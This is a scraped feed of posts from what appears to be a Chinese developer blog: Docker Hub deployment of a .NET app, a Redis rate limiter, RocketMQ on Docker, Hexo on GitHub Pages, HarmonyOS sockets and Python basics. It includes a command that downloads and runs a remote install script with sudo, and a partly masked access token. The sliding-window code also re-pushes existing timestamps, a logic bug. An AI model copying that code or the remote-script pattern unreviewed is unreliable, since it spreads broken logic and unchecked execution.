[\u0026#34;MyMvcApp.csproj\u0026#34;, \u0026#34;./\u0026#34;] RUN dotnet restore \u0026#34;MyMvcApp.csproj\u0026#34; COPY . . WORKDIR \u0026#34;/src/\u0026#34; RUN dotnet build \u0026#34;MyMvcApp.csproj\u0026#34; -c Release -o /app/build FROM build AS publish RUN dotnet publish \u0026#34;MyMvcApp.csproj\u0026#34; -c Release -o /app/publish FROM base AS final WORKDIR /app COPY --from=publish /app/publish . ENTRYPOINT [\u0026#34;dotnet\u0026#34;, \u0026#34;MyMvcApp.dll\u0026#34;] ✏️ Docker 镜像 docker build -t mymvcapp:latest . 📝在 Docker Hub 上创建仓库 登录 Docker Hub (https://hub.docker.com)。 点击 \u0026ldquo;Create Repository\u0026rdquo;。 输入仓库名称，例如 mymvcapp，然后点击 \u0026ldquo;Create\u0026rdquo;。\n💻将 Docker 镜像推送到 Docker Hub 首先，登录 Docker Hub：\ndocker login 📅标记镜像 docker tag mymvcapp:latest \u0026lt;your-dockerhub-username\u0026gt;/mymvcapp:latest 📊推送镜像到 Docker Hub docker push \u0026lt;your-dockerhub-username\u0026gt;/mymvcapp:latest = Docker Hub 用户名\ndocker run -d -p 80:80 \u0026lt;your-dockerhub-username\u0026gt;/mymvcapp:latest 🎓完整流程回顾 #创建 .NET 8 MVC 应用程序。 #在项目根目录下创建 Dockerfile。 #构建 Docker 镜像： docker build -t mymvcapp:latest . #在 Docker Hub 上创建仓库。 #登录 Docker Hub： docker login #标记并推送 Docker 镜像到 Docker Hub： docker tag mymvcapp:latest \u0026lt;your-dockerhub-username\u0026gt;/mymvcapp:latest docker push \u0026lt;your-dockerhub-username\u0026gt;/mymvcapp:latest #在本地或服务器上运行 Docker 镜像： docker run -d -p 80:80 \u0026lt;your-dockerhub-username\u0026gt;/mymvcapp:latest #通过这些步骤，将 .NET 8 MVC 部署到 Docker Hub 并运行它~~ err denied requested access to the resource is denied\ndocker logout docker login err error response from deamon:get \u0026ldquo;https://registry-1.docket.io/v2/\u0026quot;:unauthorized:incorrect username or password 用户密码错误\nhttps://docs.docker.com/go/access-tokens https://docs.docker.com/security/for-developers/access-tokens/#create-an-access-token\ndocker login -u qxxx dckr_pat_o0ZpPxxx docker tag mymvcapp:latest xx/mymvcapp:dev docker push \u0026lt;your-dockerhub-username\u0026gt;/mymvcapp:dev 推送成功后可以在hub仓库查看\n运行\ndocker run -d -p 18081:8080 -p 18082:8081 --name mywebmvcapp mymvcapp:latest END\n","permalink":"https://qfsyso.github.io/posts/.net-dockerhub/","summary":"📚Dockerfile FROM mcr.microsoft.com/dotnet/sdk:8.0 AS build WORKDIR /src COPY [\u0026#34;MyMvcApp.csproj\u0026#34;, \u0026#34;./\u0026#34;] RUN dotnet restore \u0026#34;MyMvcApp.csproj\u0026#34; COPY . . WORKDIR \u0026#34;/src/\u0026#34; RUN dotnet build \u0026#34;MyMvcApp.csproj\u0026#34; -c Release -o /app/build FROM build AS publish RUN dotnet publish \u0026#34;MyMvcApp.csproj\u0026#34; -c Release -o /app/publish FROM base AS final WORKDIR /app COPY --from=publish /app/publish . ENTRYPOINT [\u0026#34;dotnet\u0026#34;, \u0026#34;MyMvcApp.dll\u0026#34;] ✏️ Docker 镜像 docker build -t mymvcapp:latest . 📝在 Docker Hub 上创建仓库 登录 Docker Hub (https://hub.docker.com)。 点击 \u0026ldquo;Create Repository\u0026rdquo;。 输入仓库名称，例如 mymvcapp，然后点击 \u0026ldquo;Create\u0026rdquo;。","title":" .NET Dockerhub"},{"content":"在.NET中使用Redis来限制接口请求频率（每10秒只允许请求一次）\nNuGet setup StackExchange.Redis\n实现速率限制逻辑： 在你的控制器或服务层中，你需要编写一个方法来检查并更新Redis中的速率限制计数器。 设置Redis键： 为每个用户或每个IP地址（取决于你的需求）设置一个唯一的键。这个键将用于存储最后一次请求的时间戳和/或请求计数。 检查时间戳： 当请求到达时，从Redis中获取该键的值（时间戳）。如果键不存在或时间戳超过10秒，则允许请求并更新键的值（设置为当前时间戳）。 处理超过速率的请求： 如果时间戳在10秒内，则拒绝或限制该请求（返回限制状态码）。\nprivate static readonly Lazy\u0026lt;ConnectionMultiplexer\u0026gt; LazyConnection = new Lazy\u0026lt;ConnectionMultiplexer\u0026gt;(() =\u0026gt; { // 配置Redis连接字符串 \u0026#34;localhost,abortConnect=false\u0026#34; return ConnectionMultiplexer.Connect(\u0026#34;localhost:6379\u0026#34;); }); private static ConnectionMultiplexer Connection =\u0026gt; LazyConnection.Value; private static IDatabase Db =\u0026gt; Connection.GetDatabase(); public async Task\u0026lt;ActionResult\u0026gt; MyAction() { IPAddress clientIpAddress = HttpContext.Connection.RemoteIpAddress; string ipAddress = clientIpAddress.ToString(); string redisKey = $\u0026#34;rate-limit:{ipAddress}\u0026#34;; // 构建Redis键名 // 获取当前时间戳（可以是Unix时间戳或任何你选择的格式） long currentTimestamp = DateTimeOffset.UtcNow.ToUnixTimeSeconds(); // 尝试从Redis获取时间戳 var redisValue = await Db.StringGetAsync(redisKey); long lastTimestamp = redisValue.HasValue ? (long)redisValue : 0; // 检查是否超过10秒 if (currentTimestamp - lastTimestamp \u0026gt;= 10) { // 如果超过10秒，则允许请求并更新Redis键 await Db.StringSetAsync(redisKey, currentTimestamp, TimeSpan.FromSeconds(10)); // 设置键的过期时间为10秒 return Content(\u0026#34;Request allowed.\u0026#34;); } else { // 如果未超过10秒，则拒绝请求 HttpResponseMessage response = new HttpResponseMessage(HttpStatusCode.TooManyRequests) { ReasonPhrase = \u0026#34;Too Many Requests\u0026#34;, Content = new StringContent(\u0026#34;Rate limit exceeded. Please try again later.\u0026#34;) }; // 处理请求 return Content(\u0026#34;Please try again later. \u0026#34;);// throw new HttpResponseException(response); // 或者返回自定义的ActionResult } } 扩展为参数\nMyAction(string p) //... string redisKey = $\u0026#34;rate-limit:{p}\u0026#34;; 请求 /MyAction?p=2 /MyAction?p=3\n滑动窗口算法 滑动窗口算法（Sliding Window Algorithm）是一种用于解决字符串/数组 问题的算法，它通过维护一个窗口（即一个连续的子串或子数组），并在字符串或数组上滑动这个窗口来寻找满足特定条件的子串或子数组。以下是滑动窗口算法的主要内容和特点：\n维护窗口：通过两个指针（左指针和右指针）来定义窗口的边界。 移动窗口：通过移动右指针来扩展窗口，同时根据问题的要求调整左指针来缩小窗口。 更新信息：在窗口滑动的过程中，根据需要更新一些数据结构（如哈希表）来保存所需的信息。\n实现方法 步骤1.初始化：定义左指针和右指针，并初始化它们的位置。 步骤2.扩展窗口：向右移动右指针，扩展窗口，同时更新所需的信息（如字符频率的哈希表）。 步骤3.检查条件：当窗口满足特定条件时，开始收缩窗口。 步骤4.收缩窗口：向右移动左指针，缩小窗口，同时更新所需的信息。 步骤5.更新最优解：在收缩窗口的过程中，不断更新最优解（如最长子串、最短子串等）。 重复步骤：重复步骤2到步骤5，直到右指针到达字符串或数组的末尾。\n在Redis中维护一个窗口内的请求时间戳列表，而不是仅仅存储最后一次请求的时间戳。\n我们从Redis中获取存储的时间戳列表。 移除超过窗口大小的时间戳。 检查剩余的时间戳数是否超过了最大请求数 MaxRequests。 如果超过，则返回超过的响应；否则，记录当前时间戳并允许请求。\nprivate const int MaxRequests = 5; // 最大请求数 private const int WindowSizeInSeconds = 10; // 窗口大小（秒） //... // 获取Redis中存储的时间戳列表 var redisValue = await Db.ListRangeAsync(redisKey); var timestamps = redisValue.Select(value =\u0026gt; (long)value).ToList(); // 移除窗口之外的时间戳 timestamps = timestamps.Where(timestamp =\u0026gt; currentTimestamp - timestamp \u0026lt;= WindowSizeInSeconds).ToList(); if (timestamps.Count \u0026gt;= MaxRequests) { // 如果请求数超过限制，则拒绝请求 HttpResponseMessage response = new HttpResponseMessage(HttpStatusCode.TooManyRequests) { ReasonPhrase = \u0026#34;Too Many Requests\u0026#34;, Content = new StringContent(\u0026#34;Rate limit exceeded. Please try again later.\u0026#34;) }; return Content(\u0026#34;Please try again later.\u0026#34;); } else { // 如果请求数未超过限制，则允许请求并记录当前时间戳 timestamps.Add(currentTimestamp); await Db.ListRightPushAsync(redisKey, timestamps.Select(timestamp =\u0026gt; (RedisValue)timestamp).ToArray()); await Db.KeyExpireAsync(redisKey, TimeSpan.FromSeconds(WindowSizeInSeconds)); // 设置键的过期时间为窗口大小 return Content(\u0026#34;Request allowed.\u0026#34;); } ","permalink":"https://qfsyso.github.io/posts/.net-redis-10s-rate-limiter-sliding-window-algorithm/","summary":"在.NET中使用Redis来限制接口请求频率（每10秒只允许请求一次）\nNuGet setup StackExchange.Redis\n实现速率限制逻辑： 在你的控制器或服务层中，你需要编写一个方法来检查并更新Redis中的速率限制计数器。 设置Redis键： 为每个用户或每个IP地址（取决于你的需求）设置一个唯一的键。这个键将用于存储最后一次请求的时间戳和/或请求计数。 检查时间戳： 当请求到达时，从Redis中获取该键的值（时间戳）。如果键不存在或时间戳超过10秒，则允许请求并更新键的值（设置为当前时间戳）。 处理超过速率的请求： 如果时间戳在10秒内，则拒绝或限制该请求（返回限制状态码）。\nprivate static readonly Lazy\u0026lt;ConnectionMultiplexer\u0026gt; LazyConnection = new Lazy\u0026lt;ConnectionMultiplexer\u0026gt;(() =\u0026gt; { // 配置Redis连接字符串 \u0026#34;localhost,abortConnect=false\u0026#34; return ConnectionMultiplexer.Connect(\u0026#34;localhost:6379\u0026#34;); }); private static ConnectionMultiplexer Connection =\u0026gt; LazyConnection.Value; private static IDatabase Db =\u0026gt; Connection.GetDatabase(); public async Task\u0026lt;ActionResult\u0026gt; MyAction() { IPAddress clientIpAddress = HttpContext.Connection.RemoteIpAddress; string ipAddress = clientIpAddress.ToString(); string redisKey = $\u0026#34;rate-limit:{ipAddress}\u0026#34;; // 构建Redis键名 // 获取当前时间戳（可以是Unix时间戳或任何你选择的格式） long currentTimestamp = DateTimeOffset.UtcNow.ToUnixTimeSeconds(); // 尝试从Redis获取时间戳 var redisValue = await Db.","title":".NET Redis 10s Rate Limiter Sliding Window Algorithm"},{"content":"RocketMQ 是一款由阿里巴巴集团开发并开源给Apache软件基金会的分布式消息及流处理平台。以其高吞吐量、低延迟、高可用性等特点而广受欢迎。支持Java，C++, Python, Go, .NET等。\n异步解耦：可以实现上游和下游业务系统的松耦合设计，使得服务部分节点异常不会影响到核心交易系统的正常运转。在电商、金融等分布式系统中，这种解耦设计尤为重要。 削峰填谷：在如秒杀、大促等大型活动中，系统会面临巨大的流量冲击。RocketMQ利用其高性能的消息处理能力，可以有效地应对这种流量冲击，保证系统的稳定运行。 顺序消息：支持顺序消息（分区有序），可以确保消息的先进先出。这在交易系统中的订单创建、支付、退款等流程中尤为重要，因为这些流程对消息的顺序有严格要求。 分布式事务消息：支持分布式事务消息，可以保证分布式事务的强一致性。这在涉及多个服务的分布式系统中非常有用，可以确保数据的一致性和完整性。\nRocketMQ优点 高吞吐量和低延迟：能够处理大规模消息流，并提供低延迟的消息传递。这使得它非常适合处理高并发的应用场景，如电子商务和金融交易系统。 可靠性：具有高度可靠的消息传递机制。它支持消息持久化和复制，确保消息不会丢失，并能够在故障发生时进行自动恢复。 分布式扩展：支持水平扩展，可以方便地添加新的消息生产者和消费者来应对负载增加的情况。 易于部署：提供开箱即用的部署方式，非常适合在分布式系统中使用。\nRocketMQ架构 生产者（Producer） 用于产生消息的运行实体，通常集成在业务系统的上游。 主题（Topic） 消息传输和存储的分组容器，内部由多个队列组成。 队列（MessageQueue） 消息传输和存储的实际单元容器，类似于其他消息队列中的分区。 消息（Message） RocketMQ 的最小传输单元，具备不可变性。 消费者分组（ConsumerGroup） 发布订阅模型中定义的独立的消费身份分组，用于统一管理多个消费者。 消费者（Consumer） 消费消息的运行实体，集成在业务系统的下游。 订阅关系（Subscription） 发布订阅模型中消息过滤、重试、消费进度的规则配置。\n部署RocketMQ（docker） 安装 Docker： #debian curl -fsSL https://get.docker.com -o get-docker.sh sudo sh get-docker.sh 拉取 RocketMQ 镜像： 使用以下命令从 Docker Hub 拉取最新的 RocketMQ 镜像：\ndocker pull apache/rocketmq:latest 启动 RocketMQ NameServer： RocketMQ 的 NameServer 是负责管理所有 Broker 节点的目录服务。可以使用以下命令启动 NameServer：\ndocker run -d --name rmqnamesrv -p 9876:9876 apache/rocketmq:latest sh mqnamesrv ```bash ## 启动 RocketMQ Broker： RocketMQ 的 Broker 负责存储消息并处理生产者和消费者的请求。使用以下命令启动 Broker： ```bash docker run -d --name rmqbroker --link rmqnamesrv:namesrv -e \u0026#34;NAMESRV_ADDR=namesrv:9876\u0026#34; -e \u0026#34;BROKER_NAME=broker-a\u0026#34; -e \u0026#34;BROKER_ID=0\u0026#34; -e \u0026#34;AUTO_CREATE_TOPIC_ENABLE=true\u0026#34; -e \u0026#34;AUTO_CREATE_SUBSCRIPTION_GROUP=true\u0026#34; -p 10911:10911 -p 10909:10909 apache/rocketmq:latest sh mqbroker 验证 查看 NameServer 日志：\ndocker logs -f rmqnamesrv 查看 Broker 日志：\ndocker logs -f rmqbroker 使用 RocketMQ Console： 如果需要可视化管理 RocketMQ，可以运行 RocketMQ Console：\ndocker pull styletang/rocketmq-console-ng docker run -d -p 8080:8080 --link rmqnamesrv:namesrv -e \u0026#34;JAVA_OPTS=-Drocketmq.namesrv.addr=namesrv:9876\u0026#34; styletang/rocketmq-console-ng 总结\n# 拉取 RocketMQ 镜像 docker pull apache/rocketmq:latest # 启动 NameServer docker run -d --name rmqnamesrv -p 9876:9876 apache/rocketmq:latest sh mqnamesrv # 启动 Broker docker run -d --name rmqbroker --link rmqnamesrv:namesrv -e \u0026#34;NAMESRV_ADDR=namesrv:9876\u0026#34; -p 10911:10911 -p 10909:10909 apache/rocketmq:latest sh mqbroker # 启动 RocketMQ Console docker pull styletang/rocketmq-console-ng docker run -d -p 8080:8080 --link rmqnamesrv:namesrv -e \u0026#34;JAVA_OPTS=-Drocketmq.namesrv.addr=namesrv:9876\u0026#34; styletang/rocketmq-console-ng ++++++++++++++++++++++++++++++ 如果是外网环境 run Broker 外网IP\nmkdir -p /usr/data/rocketMQ/data/broker/logs mkdir -p /usr/data/rocketMQ/data/broker/store mkdir -p /usr/data/rocketMQ/data/broker/conf/ broket.conf\nbrokerClusterName = DefaultCluster brokerName = broker-a brokerId = 0 deleteWhen = 04 fileReservedTime = 48 brokerRole = ASYNC_MASTER flushDiskType = ASYNC_FLUSH namesrvAddr = 外网ip:9876 brokerIP1 = 外网ip autoCreateTopicEnable=true docker run -p 0.0.0.0:10911:10911 -p 0.0.0.0:10909:10909 -d -v /usr/data/rocketMQ/data/broker/logs:/root/logs -v /usr/data/rocketMQ/data/broker/store:/root/store -v /usr/data/rocketMQ/data/broker/conf/broker.conf:/opt/rocketmq/conf/broker.conf --name rmqbroker --link rmqnamesrv:namesrv -e \u0026#34;NAMESRV_ADDR=namesrv:9876\u0026#34; -e \u0026#34;MAX_POSSIBLE_HEAP=200000000\u0026#34; -e \u0026#34;autoCreateTopicEnable=true\u0026#34; rocketmqinc/rocketmq sh mqbroker -c /opt/rocketmq/conf/broker.conf .NET RocketMQ NuGet NewLife.RocketMQ Producer //main XTrace.UseConsole(); var producer = new Producer { NameServerAddress = \u0026#34;x.x.x.x:9876\u0026#34;, Topic = \u0026#34;t0529\u0026#34; }; try { producer.Start(); // 发送一条测试消息，以确保 Topic 被创建 for (var i = 0; i \u0026lt; 10; i++) { var str = \u0026#34;mqm\u0026#34; + i; //var str = Rand.NextString(1337); var sr = producer.Publish(str, \u0026#34;TagA\u0026#34;); } } catch (Exception ex) { Console.WriteLine($\u0026#34;Exception: {ex.Message}\u0026#34;); } finally { producer.Stop(); } Consumer var consumer = new Consumer { Topic = \u0026#34;t0529\u0026#34;, Group = \u0026#34;test\u0026#34;, NameServerAddress = \u0026#34;x.x.x.x:9876\u0026#34;, FromLastOffset = false, //SkipOverStoredMsgCount = 0, //BatchSize = 20, Log = XTrace.Log, ClientLog = XTrace.Log, }; consumer.OnConsume = OnConsume; consumer.Configure(MqSetting.Current); consumer.Start(); _consumer = consumer; ","permalink":"https://qfsyso.github.io/posts/.net-rocketmq/","summary":"RocketMQ 是一款由阿里巴巴集团开发并开源给Apache软件基金会的分布式消息及流处理平台。以其高吞吐量、低延迟、高可用性等特点而广受欢迎。支持Java，C++, Python, Go, .NET等。\n异步解耦：可以实现上游和下游业务系统的松耦合设计，使得服务部分节点异常不会影响到核心交易系统的正常运转。在电商、金融等分布式系统中，这种解耦设计尤为重要。 削峰填谷：在如秒杀、大促等大型活动中，系统会面临巨大的流量冲击。RocketMQ利用其高性能的消息处理能力，可以有效地应对这种流量冲击，保证系统的稳定运行。 顺序消息：支持顺序消息（分区有序），可以确保消息的先进先出。这在交易系统中的订单创建、支付、退款等流程中尤为重要，因为这些流程对消息的顺序有严格要求。 分布式事务消息：支持分布式事务消息，可以保证分布式事务的强一致性。这在涉及多个服务的分布式系统中非常有用，可以确保数据的一致性和完整性。\nRocketMQ优点 高吞吐量和低延迟：能够处理大规模消息流，并提供低延迟的消息传递。这使得它非常适合处理高并发的应用场景，如电子商务和金融交易系统。 可靠性：具有高度可靠的消息传递机制。它支持消息持久化和复制，确保消息不会丢失，并能够在故障发生时进行自动恢复。 分布式扩展：支持水平扩展，可以方便地添加新的消息生产者和消费者来应对负载增加的情况。 易于部署：提供开箱即用的部署方式，非常适合在分布式系统中使用。\nRocketMQ架构 生产者（Producer） 用于产生消息的运行实体，通常集成在业务系统的上游。 主题（Topic） 消息传输和存储的分组容器，内部由多个队列组成。 队列（MessageQueue） 消息传输和存储的实际单元容器，类似于其他消息队列中的分区。 消息（Message） RocketMQ 的最小传输单元，具备不可变性。 消费者分组（ConsumerGroup） 发布订阅模型中定义的独立的消费身份分组，用于统一管理多个消费者。 消费者（Consumer） 消费消息的运行实体，集成在业务系统的下游。 订阅关系（Subscription） 发布订阅模型中消息过滤、重试、消费进度的规则配置。\n部署RocketMQ（docker） 安装 Docker： #debian curl -fsSL https://get.docker.com -o get-docker.sh sudo sh get-docker.sh 拉取 RocketMQ 镜像： 使用以下命令从 Docker Hub 拉取最新的 RocketMQ 镜像：\ndocker pull apache/rocketmq:latest 启动 RocketMQ NameServer： RocketMQ 的 NameServer 是负责管理所有 Broker 节点的目录服务。可以使用以下命令启动 NameServer：\ndocker run -d --name rmqnamesrv -p 9876:9876 apache/rocketmq:latest sh mqnamesrv ```bash ## 启动 RocketMQ Broker： RocketMQ 的 Broker 负责存储消息并处理生产者和消费者的请求。使用以下命令启动 Broker： ```bash docker run -d --name rmqbroker --link rmqnamesrv:namesrv -e \u0026#34;NAMESRV_ADDR=namesrv:9876\u0026#34; -e \u0026#34;BROKER_NAME=broker-a\u0026#34; -e \u0026#34;BROKER_ID=0\u0026#34; -e \u0026#34;AUTO_CREATE_TOPIC_ENABLE=true\u0026#34; -e \u0026#34;AUTO_CREATE_SUBSCRIPTION_GROUP=true\u0026#34; -p 10911:10911 -p 10909:10909 apache/rocketmq:latest sh mqbroker 验证 查看 NameServer 日志：","title":".NET RocketMQ"},{"content":"hexo安装 npm install hexo-cli -g hexo init blog cd blog npm install hexo server\nkey配置 ssh-keygen -t ed25519 -C \u0026ldquo;email@e.com\u0026rdquo; 添加key到github\nerr git@github.com: Permission denied (publickey). fatal: Could not read from remote repository.\n配置GitHub仓库 在GitHub上创建一个新的仓库，其名称应该是 用户名.github.io，其中用户名是你的GitHub用户名。 git config \u0026ndash;global user.email \u0026ldquo;xx@qq.com\u0026rdquo; git config \u0026ndash;global user.name \u0026ldquo;user\u0026rdquo;\n_config.yml deploy: type: git repo: # 替换为你的GitHub仓库url branch: master\n安装hexo-deployer-git插件： npm install hexo-deployer-git \u0026ndash;save\n部署到GitHub： hexo clean hexo g #hexo generate hexo d #hexo deploy\n建立仓库 testhtml Settings -\u0026gt; pages\nhttps://xxx.github.io/testhtml/index.html\n","permalink":"https://qfsyso.github.io/posts/hexo-githubio/","summary":"hexo安装 npm install hexo-cli -g hexo init blog cd blog npm install hexo server\nkey配置 ssh-keygen -t ed25519 -C \u0026ldquo;email@e.com\u0026rdquo; 添加key到github\nerr git@github.com: Permission denied (publickey). fatal: Could not read from remote repository.\n配置GitHub仓库 在GitHub上创建一个新的仓库，其名称应该是 用户名.github.io，其中用户名是你的GitHub用户名。 git config \u0026ndash;global user.email \u0026ldquo;xx@qq.com\u0026rdquo; git config \u0026ndash;global user.name \u0026ldquo;user\u0026rdquo;\n_config.yml deploy: type: git repo: # 替换为你的GitHub仓库url branch: master\n安装hexo-deployer-git插件： npm install hexo-deployer-git \u0026ndash;save\n部署到GitHub： hexo clean hexo g #hexo generate hexo d #hexo deploy","title":" hexo githubio"},{"content":"socket import socket from \u0026#39;@ohos.net.socket\u0026#39;; create\nlet tcp = socket.constructTCPSocketInstance(); let promise = tcp.connect({ address: {address: \u0026#39;192.168.1.11\u0026#39;, port: 24524, family: 1} , timeout: 6000}); promise.then(() =\u0026gt; { console.log(\u0026#39;connect success\u0026#39;); tcp.send({ data:\u0026#39;Hello, server!\u0026#39; },err =\u0026gt; { if (err) { console.log(\u0026#39;send fail\u0026#39;); return; } console.log(\u0026#39;send success\u0026#39;); }) }).catch(err =\u0026gt; { console.log(\u0026#39;connect fail\u0026#39;); }); ERR 系统识别到新的sdk路径 请清除模拟器数据后 Sdk Path has been changed to xxx\n1.在Local Emulator的设备列表窗口，点击“Wipe User Data”清除模拟器数据，然后重新启动模拟器。 2.重新创建一个模拟器，然后启动新建的模拟器。\nconsole.log Log =\u0026gt; show only js log\nERR 201 module.json5 添加\n\u0026#34;requestPermissions\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;ohos.permission.INTERNET\u0026#34; } ] ERR connect fail 2301088\n需添加本机IP\nlet bindAddress = { address: \u0026#39;localhost\u0026#39;, port: 1234, family: 1 }; node server\nconst net = require(\u0026#39;net\u0026#39;); //createServer const server = net.createServer((socket) =\u0026gt; { console.log(\u0026#39;client con\u0026#39;); socket.on(\u0026#39;data\u0026#39;, (data) =\u0026gt; { console.log(`rs from client : ${data}`); socket.write(`rs server : ${data}`); }); socket.on(\u0026#39;end\u0026#39;, () =\u0026gt; { console.log(\u0026#39;client end \u0026#39;); }); }); server.listen(24524, () =\u0026gt; { console.log(\u0026#39;tcp run on 24524\u0026#39;); }); run client\n​\nwebscoket import webSocket from \u0026#39;@ohos.net.webSocket\u0026#39;; let ws = webSocket.createWebSocket(); let url = \u0026#34;ws://xxx:24524\u0026#34; ws.connect(url, (err, value) =\u0026gt; { let promise = ws.send(\u0026#34;Hello, server!\u0026#34;); promise.then((value) =\u0026gt; { console.log(\u0026#34;send success\u0026#34;) }).catch((err) =\u0026gt; { console.log(\u0026#34;send fail, error:\u0026#34; + JSON.stringify(err)) }); }); 权限 ohos.permission.INTERNET\nwebsocket更加简单一点~~\n​\n","permalink":"https://qfsyso.github.io/posts/harmonyos-socket-websocket/","summary":"socket import socket from \u0026#39;@ohos.net.socket\u0026#39;; create\nlet tcp = socket.constructTCPSocketInstance(); let promise = tcp.connect({ address: {address: \u0026#39;192.168.1.11\u0026#39;, port: 24524, family: 1} , timeout: 6000}); promise.then(() =\u0026gt; { console.log(\u0026#39;connect success\u0026#39;); tcp.send({ data:\u0026#39;Hello, server!\u0026#39; },err =\u0026gt; { if (err) { console.log(\u0026#39;send fail\u0026#39;); return; } console.log(\u0026#39;send success\u0026#39;); }) }).catch(err =\u0026gt; { console.log(\u0026#39;connect fail\u0026#39;); }); ERR 系统识别到新的sdk路径 请清除模拟器数据后 Sdk Path has been changed to xxx\n1.在Local Emulator的设备列表窗口，点击“Wipe User Data”清除模拟器数据，然后重新启动模拟器。 2.重新创建一个模拟器，然后启动新建的模拟器。\nconsole.log Log =\u0026gt; show only js log","title":"HarmonyOS socket websocket"},{"content":" 🌠setup 安装 python.org\n🐷helloworld if __name__ == \u0026#39;__main__\u0026#39;: print(\u0026#39;helloworld\u0026#39;) python test.py var 变量\nif __name__ == \u0026#39;__main__\u0026#39;: company, date, *others = [\u0026#39;hi\u0026#39;, \u0026#39;20240521\u0026#39;, \u0026#39;000\u0026#39;, \u0026#39;11111\u0026#39;] print(company, date) print(others) random 随机\ni = 0 rand_list = [] while i \u0026lt; 4: rand_num = random.randint(0, 499) if rand_num not in rand_list: rand_list.append(rand_num) i += 1 print(rand_list) list 列表 可变\n# 创建一个空列表 my_list = [] # 向列表中添加元素 my_list.append(1) my_list.append(2) my_list.append(3) print(my_list) # 输出: [1, 2, 3] # 修改列表中的元素 my_list[1] = \u0026#39;two\u0026#39; print(my_list) # 输出: [1, \u0026#39;two\u0026#39;, 3] # 列表切片 sub_list = my_list[1:3] print(sub_list) # 输出: [\u0026#39;two\u0026#39;, 3] # 删除列表中的元素 del my_list[2] print(my_list) # 输出: [1, \u0026#39;two\u0026#39;] # 创建一个包含0到9的偶数列表 even_numbers = [i for i in range(10) if i % 2 == 0] print(even_numbers) # 输出: [0, 2, 4, 6, 8] tuple 元组 不可变\n# 创建一个元组 my_tuple = (1, \u0026#39;two\u0026#39;, 3.0) print(my_tuple) # 输出: (1, \u0026#39;two\u0026#39;, 3.0) # 尝试修改元组中的元素（会抛出TypeError） ## my_tuple[1] = \u0026#39;Two\u0026#39; # 这行代码会报错，因为元组是不可变的 # 元组切片（虽然元组不可变，但你可以获取它的切片） sub_tuple = my_tuple[1:] print(sub_tuple) # 输出: (\u0026#39;two\u0026#39;, 3.0) if else 判断\nage =5 if age \u0026gt;= 6: print(\u0026#39;teenager\u0026#39;) elif age \u0026gt;= 20: print(\u0026#39;old\u0026#39;) else: print(\u0026#39;kid\u0026#39;) calculator 计算器\ndef add(x, y): \u0026#34;\u0026#34;\u0026#34;加法\u0026#34;\u0026#34;\u0026#34; return x + y def subtract(x, y): \u0026#34;\u0026#34;\u0026#34;减法\u0026#34;\u0026#34;\u0026#34; return x - y def multiply(x, y): \u0026#34;\u0026#34;\u0026#34;乘法\u0026#34;\u0026#34;\u0026#34; return x * y def divide(x, y): \u0026#34;\u0026#34;\u0026#34;除法\u0026#34;\u0026#34;\u0026#34; if y == 0: return \u0026#34;错误：除数不能为0\u0026#34; else: return x / y print(\u0026#34;选择操作：\u0026#34;) print(\u0026#34;1.加法\u0026#34;) print(\u0026#34;2.减法\u0026#34;) print(\u0026#34;3.乘法\u0026#34;) print(\u0026#34;4.除法\u0026#34;) while True: choice = input(\u0026#34;请输入你的选择(1/2/3/4): \u0026#34;) if choice in (\u0026#39;1\u0026#39;, \u0026#39;2\u0026#39;, \u0026#39;3\u0026#39;, \u0026#39;4\u0026#39;): num1 = float(input(\u0026#34;请输入第一个数字: \u0026#34;)) num2 = float(input(\u0026#34;请输入第二个数字: \u0026#34;)) if choice == \u0026#39;1\u0026#39;: print(num1, \u0026#34;+\u0026#34;, num2, \u0026#34;=\u0026#34;, add(num1, num2)) elif choice == \u0026#39;2\u0026#39;: print(num1, \u0026#34;-\u0026#34;, num2, \u0026#34;=\u0026#34;, subtract(num1, num2)) elif choice == \u0026#39;3\u0026#39;: print(num1, \u0026#34;*\u0026#34;, num2, \u0026#34;=\u0026#34;, multiply(num1, num2)) elif choice == \u0026#39;4\u0026#39;: result = divide(num1, num2) print(num1, \u0026#34;/\u0026#34;, num2, \u0026#34;=\u0026#34;, result) # 检查用户是否想继续计算 next_calculation = input(\u0026#34;想要进行下一次计算吗？(yes/no): \u0026#34;) if next_calculation.lower() != \u0026#39;yes\u0026#39;: break else: print(\u0026#34;非法输入，请重新输入\u0026#34;) match py的switch\nargs = [\u0026#39;gcc\u0026#39;, \u0026#39;hello.c\u0026#39;, \u0026#39;world.c\u0026#39;] # args = [\u0026#39;clean\u0026#39;] #args = [\u0026#39;12\u0026#39;] match args: # 如果仅出现gcc，报错: case [\u0026#39;gcc\u0026#39;]: print(\u0026#39;gcc: missing source file(s).\u0026#39;) # 出现gcc，且至少指定了一个文件: case [\u0026#39;gcc\u0026#39;, file1, *files]: print(\u0026#39;gcc compile: \u0026#39; + file1 + \u0026#39;, \u0026#39; + \u0026#39;, \u0026#39;.join(files)) # 仅出现clean: case [\u0026#39;clean\u0026#39;]: print(\u0026#39;clean\u0026#39;) case _: print(\u0026#39;invalid command.\u0026#39;) age = 19 match age: case x if x \u0026lt; 10: print(f\u0026#39;\u0026lt; 10 years old: {x}\u0026#39;) case 10: print(\u0026#39;10 years old.\u0026#39;) case 11 | 12 | 13 | 14 | 15 | 16 | 17 | 18: print(\u0026#39;11~18 years old.\u0026#39;) case 19: print(\u0026#39;19 years old.\u0026#39;) case _: print(\u0026#39;not sure.\u0026#39;) fro 循环\nnames = [\u0026#39;a1\u0026#39;, \u0026#39;b2\u0026#39;, \u0026#39;c3\u0026#39;] for name in names: print(\u0026#39;Hi \u0026#39;+ name) sum = 0 for x in [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]: sum = sum + x print(sum) function 函数\ndef my_abs(x): if x \u0026gt;= 0: return x else: return -x def my_fun( x,y ): return x,y print(my_abs(11)) print(my_abs(-11)) print(my_fun(11,22)) x1,y2 = my_fun(11,22) print(x1) def myfn(numbers): sum = 0 for n in numbers: sum = sum + n # * n return sum print(myfn([1, 2, 3, 4, 5, 6, 7, 8, 9,10])) map 迭代\ndef f(n): return n * 2 nums = [1, 2, 3, 4, 5, 6, 7, 8, 9] r = map(f, nums) print(list(r)) ERR IndentationError: unexpected indent 存在不正确的缩进\nreduce 迭代前两个元素通过函数处理，得到的结果再与第三个元素通过函数处理，依此类推\nfrom functools import reduce def add(x, y): return x + y numbers = [1, 2, 3, 4, 5] sum_of_numbers = reduce(add, numbers) print(sum_of_numbers) filter 过滤\ndef is_odd(n): return n % 2 == 1 print(list(filter(is_odd, [1, 2, 4, 5, 6, 9, 10, 15]))) sorted 排序\narr = [33,12,-22,1,12] print(sorted(arr)) lambda 